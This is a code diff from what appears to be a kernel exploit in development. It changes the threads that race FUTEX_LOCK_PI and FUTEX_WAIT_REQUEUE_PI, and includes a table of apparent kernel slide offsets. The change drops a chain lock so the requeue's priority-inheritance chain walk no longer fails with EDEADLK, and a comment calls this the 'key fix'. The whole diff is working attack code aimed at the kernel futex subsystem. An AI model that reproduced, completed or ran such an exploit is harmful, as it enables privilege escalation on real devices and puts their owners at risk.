@@ -20,11 +20,10 @@ static const uintptr_t slide_p0_offsets[] = {
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
-static uint32_t slide_f_pi_chain;
+static uint32_t slide_f_ready;
 static atomic_int slide_waiter_ready;
 static atomic_int slide_waiter_waiting;
 static atomic_int slide_owner_started;
-static atomic_int slide_owner_acquired;
 static atomic_int slide_deadlock_seen;
 static atomic_int slide_waiter_ok;
 static atomic_int slide_route_done;
@@ -653,27 +652,30 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
-  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter lock chain errno=%d\n", errno);
-    return NULL;
-  }
-
+  /* Signal readiness instead of locking chain_lock */
   atomic_store(&slide_waiter_ready, 1);
-  while (!atomic_load(&slide_owner_started)) {
-    usleep(1000);
-  }
 
+  /* Wait for owner to acquire target_lock and signal us */
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  timeout.tv_nsec += SLIDE_WAIT_NSEC;
-  if (timeout.tv_nsec >= 1000000000L) {
-    timeout.tv_sec++;
-    timeout.tv_nsec -= 1000000000L;
+  timeout.tv_sec += 5;
+  errno = 0;
+  long ready_ret = futex_op(&slide_f_ready, FUTEX_WAIT, 0, &timeout, NULL, 0);
+  int ready_errno = errno;
+  pr_info("slide ready_futex wait ret=%ld errno=%d\n", ready_ret, ready_errno);
+
+  /* Wait on wait_futex with requeue target */
+  struct timespec wait_timeout;
+  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_timeout));
+  wait_timeout.tv_nsec += SLIDE_WAIT_NSEC;
+  if (wait_timeout.tv_nsec >= 1000000000L) {
+    wait_timeout.tv_sec++;
+    wait_timeout.tv_nsec -= 1000000000L;
   }
 
   atomic_store(&slide_waiter_waiting, 1);
   errno = 0;
-  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+  long wait_ret = futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &wait_timeout,
                            &slide_f_pi_target, 0);
   int wait_errno = errno;
   pr_info("slide wait_requeue_pi ret=%ld errno=%d\n", wait_ret, wait_errno);
@@ -683,14 +685,6 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
   }
   atomic_store(&slide_waiter_ok, 1);
   while (!atomic_load(&slide_deadlock_seen)) {
-    __asm__ volatile("yield" ::: "memory");
-  }
-  if (futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide waiter unlock chain errno=%d\n", errno);
-    atomic_store(&slide_route_done, 1);
-    return NULL;
-  }
-  while (!atomic_load(&slide_owner_acquired)) {
     __asm__ volatile("yield" ::: "memory");
   }
 
@@ -703,21 +697,26 @@ void *slide_waiter_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_owner_thread(void *arg __attribute__((unused))) {
+  /* Acquire target lock */
   if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
     pr_error("slide owner lock target errno=%d\n", errno);
     return NULL;
   }
 
+  /* Wait for waiter to be ready */
   while (!atomic_load(&slide_waiter_ready)) {
     usleep(1000);
   }
 
+  /* Signal waiter: target_lock acquired, safe to wait */
+  slide_f_ready = 1;
+  futex_op(&slide_f_ready, FUTEX_WAKE, 1, NULL, NULL, 0);
+
   atomic_store(&slide_owner_started, 1);
-  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
-    pr_error("slide owner lock chain errno=%d\n", errno);
-    return NULL;
-  }
-  atomic_store(&slide_owner_acquired, 1);
+
+  /* NO chain_lock acquisition - key fix!
+   * Owner is NOT blocked on anything, so requeue's chain walk
+   * finds owner->pi_blocked_on == NULL and exits without EDEADLK */
 
   for (;;) {
     sleep(1);
